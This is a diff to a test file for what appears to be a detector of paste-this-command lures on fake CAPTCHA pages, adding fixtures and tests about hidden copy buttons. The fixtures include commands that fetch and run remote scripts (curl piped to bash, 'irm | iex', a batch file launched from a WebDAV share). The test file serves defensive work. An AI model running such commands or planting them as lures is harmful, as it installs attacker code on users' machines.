@@ -42,6 +42,7 @@ const LURES = {
 const CONTEXT_LURES = {
   mac_curl_pipe: [`curl -s https://get.example.com/i.sh | bash`, MAC_LURE_PAGE],
   ps_https_iex: [`irm https://check.example.com/v | iex`, FAKE_CAPTCHA_PAGE],
+  unc_webdav: [`cmd /c start \\\\203.0.113.44@SSL\\DavWWWRoot\\v.bat`, FAKE_CAPTCHA_PAGE],
 };
 
 const BENIGN = {
@@ -132,4 +133,26 @@ test("huge input is bounded", () => {
   analyze("a ".repeat(500000) + "powershell", { pageText: "x".repeat(500000) });
   analyze("curl " + "a".repeat(100000), {});
   assert.ok(Date.now() - t0 < 1000);
+});
+
+test("intent mismatch: hidden copy behind a 'Verify' button escalates an unknown-looking command", () => {
+  // Script from a UNC share: suspicious, but not blockable on content alone.
+  const text = "powershell -File \\\\203.0.113.8\\share\\v.ps1";
+  assert.notEqual(analyze(text, { programmatic: true }).verdict, "block");
+  const r = analyze(text, { programmatic: true, visibleOnPage: false, trigger: "Verify" });
+  assert.equal(r.verdict, "block", JSON.stringify(r.reasons.map((x) => x.id)));
+  assert.ok(r.deceptive);
+});
+
+test("intent match: visible command with a Copy button is trusted more", () => {
+  const r = analyze("curl -fsSL https://get.docker.com | sh", { programmatic: true, visibleOnPage: true, trigger: "Copy" });
+  assert.equal(r.verdict, "allow");
+  assert.ok(r.reasons.some((x) => x.id === "honest_copy"));
+  assert.equal(r.deceptive, false);
+});
+
+test("deceptive flag arms the guard even when the score is below block", () => {
+  const r = analyze("powershell -ExecutionPolicy Bypass -File .\\setup.ps1", { programmatic: true, visibleOnPage: true, trigger: "Continue" });
+  assert.equal(r.verdict, "warn");
+  assert.ok(r.deceptive);
 });
